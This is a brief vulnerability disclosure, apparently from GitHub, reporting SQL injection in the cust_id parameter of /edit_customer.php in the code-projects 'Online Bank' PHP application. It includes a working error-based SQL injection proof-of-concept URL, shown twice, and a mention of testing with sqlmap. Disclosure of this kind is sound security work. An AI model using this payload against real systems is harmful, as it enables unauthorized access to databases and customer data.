# Summary
There is a sql injection vulnerability in code-project Online Bank (https://code-projects.org/online-bank-in-php-css-javascript-and-mysql-free-download/).

Affected component is `/edit_customer.php`.

# Details
First, login as **ADMIN**.

In `/edit_customer.php?cust_id=1`,
parameter `cust_id` is vulnerable to sql injection, 
![image](https://github.com/user-attachments/assets/02a9f878-3a47-4347-ab58-632d0a90c65a)


PoC:
```
/edit_customer.php?cust_id=1 OR (SELECT 5641 FROM(SELECT COUNT(*),CONCAT(0x71787a7a71,(SELECT (ELT(5641=5641,1))),0x7171787a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
```
![image](https://github.com/user-attachments/assets/e71c7551-500a-4945-9fb5-37a161f3d3c9)



we can use `sqlmap` to test:
![image](https://github.com/user-attachments/assets/9df634b6-b53e-4c04-a70e-d72458a971e8)





# PoC
```
/edit_customer.php?cust_id=1 OR (SELECT 5641 FROM(SELECT COUNT(*),CONCAT(0x71787a7a71,(SELECT (ELT(5641=5641,1))),0x7171787a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
```
![image](https://github.com/user-attachments/assets/e71c7551-500a-4945-9fb5-37a161f3d3c9)

![image](https://github.com/user-attachments/assets/9df634b6-b53e-4c04-a70e-d72458a971e8)
